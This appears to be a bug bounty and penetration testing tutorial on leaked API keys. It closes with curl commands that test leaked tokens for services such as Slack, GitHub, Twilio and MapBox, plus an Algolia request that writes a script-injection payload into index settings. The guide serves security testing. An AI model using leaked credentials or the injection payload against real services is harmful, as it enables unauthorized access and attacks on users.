# API Key Leaks

# Introduction:
APIs (Application Programming Interfaces) have become the backbone of modern software development, enabling seamless communication and integration between different applications and services. However, the security of APIs and the sensitive data they handle is of utmost importance. In this article, we will delve into the concept of API key leaks, their potential consequences, and how bug bounty hunters and penetration testers can utilize them in their assessments.

## Understanding API Keys:
API keys are unique alphanumeric codes issued by an application or service provider to authenticate and authorize access to their APIs. These keys are often embedded in requests made to the API and serve as a form of identification for the requesting application or user. API keys are typically categorized as either public or private, depending on their purpose and level of access granted.

### API Key Leaks:
API key leaks occur when these sensitive keys are unintentionally exposed or disclosed. This can happen due to a variety of reasons, such as insecure storage, improper handling, or vulnerabilities in the application itself. When an API key is leaked, it can be used by malicious actors to gain unauthorized access to the associated API and potentially exploit the system.

Consequences of API Key Leaks:
The consequences of API key leaks can be severe and far-reaching. Some of the potential risks include:

Unauthorized Access: Attackers armed with leaked API keys can gain access to protected resources and perform actions on behalf of legitimate users, leading to data breaches, unauthorized modifications, or theft of sensitive information.

Financial Implications: Compromised API keys can be used to carry out fraudulent activities, such as making unauthorized transactions, accessing premium features without payment, or generating excessive usage charges.

Reputation Damage: API key leaks can erode the trust users place in an application or service. Public exposure of sensitive information can tarnish a company's reputation and result in a loss of business.

### API Key Leaks and Bug Bounty Hunting:
Bug bounty hunters are security researchers who actively search for vulnerabilities in applications and report them to the concerned organizations for a reward. API key leaks can be valuable findings for bug bounty hunters. Here's how they can utilize them in their assessments:

Reconnaissance: Bug bounty hunters often perform reconnaissance activities to gather information about a target application. Identifying potential API endpoints and looking for indicators of API key exposure can help them focus their efforts on areas that are more likely to yield vulnerabilities.

Exploitation: If a bug bounty hunter discovers a leaked API key, they can attempt to exploit it to gain unauthorized access or perform actions beyond their intended scope. By understanding the associated API's functionality, they can identify potential attack vectors and demonstrate their impact to the organization.

Proof of Concept: A leaked API key can serve as a solid proof of concept for demonstrating the risk and severity of an API-related vulnerability to the organization. Demonstrating the ability to abuse a leaked API key effectively highlights the potential consequences and helps organizations understand the urgency of remediation.

### API Key Leaks and Penetration Testing:
Penetration testers, like bug bounty hunters, play a crucial role in identifying vulnerabilities in systems and networks. Here's how API key leaks can be utilized during penetration testing:

Black-Box Testing: During a black-box penetration test, where limited information about the target is available, discovering a leaked API key can provide a valuable entry point for further exploitation and gaining deeper access to the system.

Post-Exploitation: Once a penetration tester has gained access to a system or network, discovering and exploiting leaked API keys can help them escalate privileges, move laterally, or gain access to additional resources.

Security Awareness: By including API key leak scenarios in penetration testing engagements, organizations can raise awareness among their development teams and encourage best practices in API key management. This proactive approach helps prevent future leaks and reinforces the importance of secure coding practices.

# Conclusion:
API key leaks pose significant risks to the security and integrity of applications and services that rely on APIs. Bug bounty hunters and penetration testers play a crucial role in identifying and mitigating these risks. By understanding the potential consequences of API key leaks and leveraging them as part of their assessments, these professionals contribute to improving the overall security posture of organizations, ultimately enhancing trust in the digital ecosystem.

### Tutorials for API Key Vulnerabilities
* [Find Hidden API Keys & How to Use Them](https://community.turgensec.com/finding-hidden-api-keys-how-to-use-them/) - A good article on what this is all about
* [MapBox API Key Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/) - Exactly what it describes a MapBox API Key Documentation
* [Project Blacklist3r](https://notsosecure.com/project-blacklist3r) - A tool to find and store leaked API keys for penetration testing purposes
* [Saying Goodbye to My Favorite 5 Minute P1](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/) - A good overview of API leaks and how they could be discovered easily

### Payloads for API Key Vulnerabilities

Below is a listing of some of the known payloads for API keys, if you know of others that I am missing feel free to let me know by creating a ticket or by creating a pull request where you add them yourself.

#### Algolia

```
curl --request PUT \
--url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
--header 'content-type: application/json' \
--header 'x-algolia-api-key: <example-key>' \
--header 'x-algolia-application-id: <example-application-id>' \
--data '{"highlightPreTag": "<script>alert(1);</script>"}'

```

#### Slack API Token
```
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"

```

#### Facebook Access Token

```
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2

```

#### Github client id and client secret

```
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'

```

#### Twilio Account_sid and Auth Token

```
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN

```
#### Twitter API Secret

```
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'

```

#### Twitter Bearer Token

```
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'

```
#### Gitlab Personal Access Token

```
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"

```

#### MapBox API Token

```
#Check token validity
curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"

#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"

```